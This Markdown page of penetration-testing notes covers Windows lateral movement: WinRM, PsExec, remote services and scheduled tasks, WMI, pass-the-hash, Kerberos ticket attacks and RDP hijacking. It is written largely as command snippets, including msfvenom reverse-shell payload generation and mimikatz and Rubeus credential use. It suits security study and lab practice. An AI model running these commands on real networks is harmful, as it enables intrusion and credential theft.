---
title: Windows lateral movement notes
---

- [1. Powershell Remoting (WinRM)](#1-powershell-remoting-winrm)
  - [1.1. One-to-one](#11-one-to-one)
  - [1.2. One-to-many](#12-one-to-many)
  - [1.3. With credentials](#13-with-credentials)
- [2. PsExec](#2-psexec)
- [3. services](#3-services)
  - [3.1. Service creation](#31-service-creation)
  - [3.2. Reverse shell](#32-reverse-shell)
- [4. Scheduled tasks](#4-scheduled-tasks)
- [5. Abusing WMI](#5-abusing-wmi)
  - [5.1. WMI session](#51-wmi-session)
  - [5.2. Reverse shell via MSI packages](#52-reverse-shell-via-msi-packages)
  - [5.3. Command execution (blind)](#53-command-execution-blind)
  - [5.4. Service creation (blind)](#54-service-creation-blind)
  - [5.5. Scheduled task creation (blind)](#55-scheduled-task-creation-blind)
- [6. NTLM](#6-ntlm)
  - [6.1. Pass-the-Hash (PtH)](#61-pass-the-hash-pth)
- [7. Kerberos](#7-kerberos)
  - [7.1. Pass-the-Ticket](#71-pass-the-ticket)
  - [7.2. Pass-the-Key](#72-pass-the-key)
  - [7.3. Overpass-the-Hash](#73-overpass-the-hash)
- [8. RDP hijacking](#8-rdp-hijacking)
- [9. User hunting](#9-user-hunting)

## 1. Powershell Remoting (WinRM)
Powershell has built-in ability to run commands remotely on different machines. It's achived using WinRM protocol. It's commonly used in enterprise management tasks so it's not very suspicious. It uses `5985` port by default.

> **IMPORTANT**: Powershell Remoting requires local administrator privileges on the target machine to use it. An automatic script could check connection status and determine if there's local admin privilege on a certain host.

### 1.1. One-to-one
One-to-one type of Powershell Remoting execution is interactive, stateful and runs in a new process (`wsmprovhost`).

```powershell
# Perform remote logon with interactive session
Enter-PSSession -ComputerName <target>

# Create a new remote session
$sess = New-PSSession -ComputerName <target>

# Enter previously saved session
Enter-PSSession -Session $sess
```

There's also an older (not Powershell compliant) but quicker method:

```powershell
# With credentials
winrs.exe -u:<USER> -p:<PASS> -r:<TARGET_MACHINE> "cmd.exe"

# With the current user privileges
winrs.exe -r:<TARGET_MACHINE> "cmd.exe"
```

### 1.2. One-to-many
One-to-many type of Powershell Remoting execution is non-interactive (run and forget). It executes command parallely without interaction for many machines. It's a great technique to check current permissions on remote machines and pass hashes.

```powershell
# Invoke command on the remote machine
Invoke-Command -ComputerName <target> -ScriptBlock {<PS_COMMAND>}
```

This cmdlet is also able to execute local PS script on a remote machine. It can be `mimikatz` for example.

```powershell
# Invoke local PS script on remote machines
Invoke-Command -ComputerName (Get-Content "<HOSTS_LIST_FILE>") -FilePath <script-path.ps1>
```

### 1.3. With credentials

```powershell
$user = '<USER>';
$pass = '<PASSWORD>';
$securePassword = ConvertTo-SecureString $pass -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $user, $securePassword;

# Interactive session
Enter-PSSession -Computername <TARGET> -Credential $credential

# Remote command execution
Invoke-Command -Computername <TARGET> -Credential $credential -ScriptBlock {<PS_COMMAND>}
```

## 2. PsExec
PsExec is Sysinternals tool. It can execute processes remotely on any machine where we can access. PsExec uses SMB protocol (445/TCP). Target account must be a member of _Administrators_ group.

PsExec workflow:

1. Connect to Admin$ share and upload a `psexesvc.exe` service binary.
2. Connect to the Service Control Manager (SCM), run a service named `PSEXESVC` and associate the service binary with `C:\Windows\psexesvc.exe`.
3. Create named pipes to handle stdin/out/err.

```powershell
psexec64.exe \\<target-ip> -u <user> -p <password> -i "cmd.exe"
```

## 3. services
Windows services can be used to run arbitrary commands because they execute a command when started. Standard tool for creating a service on remote host is the `sc.exe`. It exploits default ability of Windows services to execute arbitrary commands at the start of the service. Target account must be member of the _Administrators_ group. The victim's OS is in charge of starting the service, so the attacker is not be able to look at the command's output - it's blind attack.

It tries to connect to the Service Control Manager (SVCCTL) throught RPC in two ways:

1. The client will first connect to the Endpoint Mapper (EPM) at port 135 (catalogue of available RPC endpoints) and request information on the SVCCTL service program. The EPM will respond with the IP:PORT of SVCCTL (usually a dynamic port in the range of 49152-65535).
2. The client will try to reach SVCCTL through SMB named pipes on port 445 (SMB) or 139 (SMB over NetBIOS).

> NOTE: The victim's OS is in charge of starting the service, you won't be able to look at the command output.

```bash
# Generate service campatible (exe-service) reverse shell
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=<attacker-ip> LPORT=<attacker-port> -o <output-name.exe>
```

> NOTE: `sc.exe` doesn't allow to specify credentials as a part of the command so it might be necessary to start new shell (with another account) using `runas` command.

```powershell
# Start new shell

# Execute command - create a user
sc.exe \\<target-ip> create <service> binPath= "net user <user> <pass> /add" start= auto
sc.exe \\<target-ip> start <service>

# Stop service
sc.exe \\<target-ip> stop <service>
sc.exe \\<target-ip> delete <service>
```

### 3.1. Service creation

```powershell
$ServiceName = "<service-name>"
$Command = "<cmd-payload>"

# Run a service remotely
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
  Name = $ServiceName;
  DisplayName = $ServiceName;
  PathName = $Command;
  ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
  StartMode = "Manual"
}
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE '$ServiceName'"
Invoke-CimMethod -InputObject $Service -MethodName StartService

# Stop the service
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

### 3.2. Reverse shell
If we try to run a reverse shell using this method, the reverse shell disconnects immediately after execution. Service executables are different to standard `.exe` files, and therefore non-service executables are killed by the service manager almost immediately. `Msfvenom` supports the `exe-service` format, which will encapsulate any payload inside a fully functional service executable, preventing it from getting killed.

## 4. Scheduled tasks
Scheduled tasks can be created remotely. The `schtasks` tool is available in any Windows installation. The victim's OS is in charge of running the scheduled task, so the attacker is not able to look at the command's output - it's blind attack.

> NOTE: The victim's OS is in charge of running the scheduled task, you won't be able to look at the command output.

```powershell
# Create a task
schtasks /s <target-ip> /RU <user> /create /tn <task-name> /tr <command> /sc ONCE /sd 01/01/1970 /st 00:00 

# Run the task
schtasks /s <target-ip> /run /TN <task-name> 

# Stop the task
schtasks /S <target-ip> /TN <task-name> /DELETE /F
```

## 5. Abusing WMI
WMI allows administrators to perform standard management tasks that attacker can abuse to perform lateral movement. Abusing WMI an attacker is able to remotely create a process or a scheduled task, run a service, install a MSI package.

WMI provides **bunch of ways to perform lateral movement** but first of all WMI session must be established:

### 5.1. WMI session

```powershell
$Username = "<target-user>";
$Password = "<target-pass>";
$TargetHost = "<target-ip>";

# Create PSCredential object
$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force;
$Credential = New-Object System.Management.Automation.PSCredential $Username, $SecurePassword;

# Establish WMI session
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName $TargetHost -Credential $Credential -SessionOption $Opt -ErrorAction Stop
```

### 5.2. Reverse shell via MSI packages

```powershell
# Generate MSI reverse shell payload 
msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4443 -f msi > "<package-name.msi>"

# Install MSI payload
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "<package-path.msi>"; Options = ""; AllUsers = $false}
```

### 5.3. Command execution (blind)

```powershell
# Execute a command remotely (blind)
$Command = "<cmd-payload>"
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command}
```

### 5.4. Service creation (blind)

```powershell
$ServiceName = "<service-name>"
$Command = "<cmd-payload>"

# Run a service remotely
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
  Name = $ServiceName;
  DisplayName = $ServiceName;
  PathName = $Command;
  ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
  StartMode = "Manual"
}
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE '$ServiceName'"
Invoke-CimMethod -InputObject $Service -MethodName StartService

# Stop the service
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

### 5.5. Scheduled task creation (blind)

```powershell
$Command = "<cmd-payload>"
$Args = "<payload-args>"
$TaskName = "<task-name>"

# Run a task
$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName $TaskName
Start-ScheduledTask -CimSession $Session -TaskName $TaskName

# Stop the task
Unregister-ScheduledTask -CimSession $Session -TaskName $TaskName
```

## 6. NTLM
Lateral movement techniques related to the NTLM authentication.

### 6.1. Pass-the-Hash (PtH)
As a result of extracting credentials from a host an attacker might get NT hash. Sometimes it can be too hard to crack the hash but it's possible to authenticate with the hash itself. PtH attacks can work over a large number of technologies, either using Windows-Windows or Linux-Windows tools.

Here's a great [overview of different technologies](https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/). Sometimes certain technology might not work, then it's worth to check another one.

> Some of the technologies that might be used to perform PtH: SMB, WinRM, PsExec, WMI, RPC, RDP.

```bash
# Get shell via WinRM
evil-winrm -i <victim-ip> -u <username> -H <nt-hash>

# Get shell via SMB (PsExec)
impacket-psexec -hashes <NT:LM> <username@target-ip>
```

## 7. Kerberos
Lateral movement techniques related to the NTLM authentication.

### 7.1. Pass-the-Ticket
Sometimes it is possible to extract Kerberos tickets and session keys (both are required) from LSASS memory using e.g. `mimikatz` or `rubeus`. Best tickets to steal are TGTs because they can be used to access any service. TGSs are only good for some specific services. Injecting ticket in our own session doesn't require administrator privileges.

```powershell
# Inject ticket in the current logon session
Rubeus.exe ptt /ticket:<b64-ticket|kirbi-file>

# List Kerberos keys in memory (check if injected successfully)
klist

# Confirm that you have Administrator rights
dir \\<dc-ip>\C$
```

### 7.2. Pass-the-Key
While PtH attacks involve stealing and using hashed password values to gain unauthorized access to computer systems, Pass-the-Key attacks target encryption keys instead of password hashes.

A user must prove its identity to the KDC while requesting a TGT. A **key** derived from user's password is used for this purpose (both the KDC and the user posses the key). The key is actually hashed password converted into an encryption key compatible with one of the following algorithms: DES, RC4, AES-128 or AES-256 used by Kerberos. Which encyrption algorithm is actually in use depends on the Kerberos configuration.

The key is used to encrypt a timestamp sent by the user during the TGT requesting process. They depends on the algorithm used to encrypt the timestamp. If an attacker obtain any of these keys, he can ask the KDC for a TGT without providing the actual user's password.

> **NOTE**: Pass-the-Key is usually called simply _Overpass-the-Hash_. The technique is basically the same but the idea is a little bit different.

```powershell
# Request TGT using AES-256 key
./Rubeus.exe asktgt /user:<USER> /aes256:<AES_KEY> /opsec /createnetonly:C\Windows\System32\cmd.exe /show /ptt

# Check if TGT has been granted successfully
klist
```

### 7.3. Overpass-the-Hash
Same as the _pass-the-key_ technique. If the RC4 algorithm is used by Kerberos, the RC4 key is equal to the NT hash of a user. It means that if an attacker is able to steal the NT hash, he would be able to request the TGT even if the NTLM authentication is disabled.

```powershell
# Run a :command as a different :user using :key
./mimikatz.exe 
> sekurlsa::pth /user:<USER> /rc4:<KEY> /run:<COMMAND>

# Request TGT using RC4
./Rubeus.exe asktgt /user:<USER> /rc4:<RC4_KEY> /ptt

# Check if TGT has been granted successfully
klist
```

## 8. RDP hijacking
TBD

```powershell
# List sessions
query session

# Hijack
tscon <id> /dest:<current-connection>
```

## 9. User hunting
[Read more](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/tree/master/D%20-%20User%20Hunting)

User hunting is basically a proces of finding interesting lateral-movement vectors. ACLs, privileges, groups and AD/local groups are so complicated that very often it's not so easy to find what we can actualy do with the current user. For example, our AD user might be a member of local Administrators group on some random machine in the network and we want to know about this. Details like so are not easy-retrievable because they usually require whole set of different commands. That's why they are usually used from automatic modules (e.g. `PowerUp.ps1`).
